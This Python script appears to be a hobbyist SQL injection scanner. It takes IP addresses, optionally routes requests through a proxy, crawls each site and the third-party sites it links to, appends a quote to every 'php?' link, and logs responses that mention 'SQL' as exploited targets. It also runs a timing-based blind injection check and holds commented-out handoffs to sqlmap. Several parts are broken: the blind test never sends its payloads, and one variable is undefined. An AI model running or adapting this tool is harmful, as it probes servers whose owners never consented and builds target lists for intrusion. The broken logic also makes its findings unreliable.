#Python3.9
import requests 
from bs4 import BeautifulSoup
from lxml import html, etree
import sys, fnmatch, threading
import re, os
### i could make this code clean, but i didnt.
def presentation():

    print("   ##############################################")
    print("   #                                            #")
    print("   #          I spy with my little SQL eye      #")
    print("   #     ~Eyezik      github.com/00xZ           #")
    print("   #                                            #")
    print("   #  v2.6         Use: -h for help             #")
    print("   #                                            #")
    print("   ##############################################")
def blind_sql_test(okay, proxy):
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"sqli"}
    payload_file = open("blind_payloads_sqli")
    for payload in payload_file.readlines():
        sqli = payload.strip("\n")
        blind_url = okay
        print("       [+] "+blind_url +" : Blind SQLi")
        isitblind = requests.get(blind_url, timeout=30, headers=headers, proxies=proxy, follow_redirects=True)
        print("con")
        the_time = (isitblind.elapsed.total_seconds())
        print(the_time)
        if (the_time) > (float(60)): # change the 6 to any timeout you want depending on payloads
            try:
                print ("Found SQLi: "+ blind_url)
                xx = open("vulnSQLi.txt", "a+")
                xx.write(blind_url + "\n")
                xx.close
            except: pass
        else: 
             print("       [-] None found.")
                
def gethref(site, proxy):
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
    ur = (site)
    print(" [x] ~ SCAN: " + ur + " ~ [x]")
    try:
        req = requests.get(ur, timeout=6, headers=headers, proxies=proxy)
        soup = BeautifulSoup(req.text, 'html.parser')
        for link in soup.select('a[href*="php?"]'):
            okay = (link["href"])
            #print(okay)
            serv = (okay + "'")
            try:
                urlIIQ = bool(ur in okay)#Url Is In Quiry
                #print(urlIIQ) debug
                if urlIIQ == False:
                    okay = (ur + "/" + okay)
                else: pass
            except: pass
            fo1 = open("maybeSQLi.txt", "a+")
            fo1.write(serv + "\n")
            fo1.close 
            print("      [+] Sending payload " + okay)
            reeqee = requests.get(serv, timeout=6, headers=headers, proxies=proxy)
            souper = BeautifulSoup(reeqee.text, "html.parser")
            if souper(text=lambda t: "SQL" in t):
                print("\n [!] " + serv + " :  [!] Exploited [!] \n")
                fo = open("vulnSQLi.txt", "a+")
                fo.write(serv + "\n")
                fo.close
                # os.system('mapit2.bat "' + okay + '"') i added this to send it to sqlmap 
            else:
                # os.system('mapit.bat "' + okay + '"') this as a backup for my code is shit
                print("   [x] Testing Blind SQLi [x] : " + serv )
                blind_sql_test(okay, proxy)
            pass
    except:
        blind_sql_test(okay, proxy)
        print("  [!] Timed out after timeout check maybe change timeout in script: " + ur)



		
		

def title(url, proxy):
	url = (url)
	sitelists = []
	#print("[+] Deep looking: " +url)
	blacklist = ['*stackoverflow*', "*mikrotik*", "*plesk*", "*pinterest*", '*youtu*',  '*wikipedia*', "*apache*", '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
	try:
		headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
		rqt = requests.get(url, timeout=6, verify=True, headers=headers, proxies=proxy)
		soupr = BeautifulSoup(rqt.content, 'html.parser')
		
		for link in soupr.select('a[href*="http"]'):
			site = (link.get('href'))
			site = str(site)
			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
				continue
			print("\n [!] Found Branch: " +site)
			if site not in sitelists:
				try:
					r = requests.get(site, timeout=6, verify=True, headers=headers, proxies=proxy)
					soup = BeautifulSoup(r.content, 'lxml')
					title = (soup.select_one('title').text)
					#print("  [+] Branched: " + site + " : " + title + "  [+]")
					#print("Appended branch: " + site)
					sitelists.append(site)
					#print("Appended ")
					gethref(site, proxy)
				except:
					#print("Branch already scanned: " + site)
					pass
			else:
				pass
		try:
			r = requests.get(site, timeout=6, verify=True, headers=headers, proxies=proxy)
			soup = BeautifulSoup(r.content, 'lxml')
			title = (soup.select_one('title').text)
			#print("  [+] 2 2 2 Branched: " + site + " : " + title + "  [+]")
			kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
			gethref(site, proxy)
		except: pass
	except:
		#print("Sending " + site)
		gethref(site, proxy)
def whatitbe(ip, proxy):
	url = ("http://" + ip + "/")
	if proxy == '':
		pass
	else:
		proxy = {"http": "http://" +proxy}
	#print(proxy)
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
	try:
		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		print(" [!] Site Timed Out- "+url+" [!] ")
		url = ("https://" +ip+ "/")
		pass
	try:
		if proxy == '':
			pass
		else:
			proxy = {"https": "http://" +proxy}
		#print(proxy)
		url = ("https://" +ip+ "/")
		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		#print(" [!] Site(s) Timed Out- "+url+" [!] ")
		pass
def main():
	presentation()
	count = 0
	if str(sys.argv[1]) == "-h":
		print("Use:")
		print("    Single server scan: sqleye.py IP")
		print("    Scan with proxy: sqleye.py (IP/ -f filename) -p 1.2.3.4")
		print("    Scan ips in file use: sqleye.py -f filename")
	elif str(sys.argv[1]) == "-f":
		input_file = open(sys.argv[2])
		proxy = ('')
		try:
			if str(sys.argv[3]) == "-p":
				proxy = str(sys.argv[4])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		for i in input_file.readlines():
			ip = i.strip("\n")
			whatitbe(ip, proxy)
	elif len(sys.argv) > 1 :
		ip = str(sys.argv[1])
		proxy = ('')
		print("Server: " + ip)
		try:
			if str(sys.argv[2]) == "-p":
				proxy = str(sys.argv[3])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		whatitbe(ip, proxy)
	else:
		print("Use -h for help")
		pass
main()



